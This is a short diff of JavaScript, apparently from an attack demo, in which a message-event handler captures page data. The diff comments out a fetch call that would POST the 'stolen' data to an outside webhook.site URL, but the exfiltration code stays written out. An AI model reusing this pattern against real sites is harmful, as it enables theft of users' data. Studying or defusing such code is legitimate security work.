@@ -28,13 +28,13 @@
         log('[DATA] ' + e.data.result.data);
         
         // Exfiltrate to your server
-        fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/stolen', {
-          method: 'POST',
-          body: JSON.stringify({
-            stolen: e.data.result.data,
-            timestamp: new Date().toISOString()
-          })
-        });
+        // fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/stolen', {
+        //   method: 'POST',
+        //   body: JSON.stringify({
+        //     stolen: e.data.result.data,
+        //     timestamp: new Date().toISOString()
+        //   })
+        // });
       }
     });
 
